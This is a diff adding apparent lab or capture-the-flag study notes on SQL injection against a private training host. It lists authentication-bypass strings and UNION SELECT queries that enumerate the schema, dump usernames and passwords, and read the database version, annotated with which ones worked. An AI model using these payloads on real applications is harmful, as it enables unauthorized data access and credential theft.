@@ -41,11 +41,30 @@ EASY-5STEP SQL INJECTION
   4. Craft Query
   5. Get Money/Points
 
+FOR GET REQUEST via URL SEND TRUE OF FALSE STATEMENT THEN VIEW POST REQUEST IN WEB DEV TOOLS, PUT A QUESTION MARK IN URL AND COPY AND PASTE RAW DATA SENT IN POST 
+tom' OR 1='1
+username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271
 
 
+POST METHOD
+  Ford' OR 1='1                       #DID NOT WORK
+  Dodge' OR 1='1                      #DID NOT WORK
+  Honda' OR 1='1                      #DID NOT WORK
+  Audi' OR 1='1                       #THIS ONE WORKED
+  Audi' UNION SELECT 1,2,3,4; #
+  Audi' UNION SELECT 1,2,3,4,5; #
+  Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
+  Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
+  Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
+  Audi 'UNION SELECT @@version,2,3,4,5; #            #SQL VERSION
 
 
-
+GET METHOD USING URL
+  http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1                #SELECTION 1 DID NOT WORK
+  http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1                #SELECTION 2 DID WORK
+  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
+  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION
 
 
 
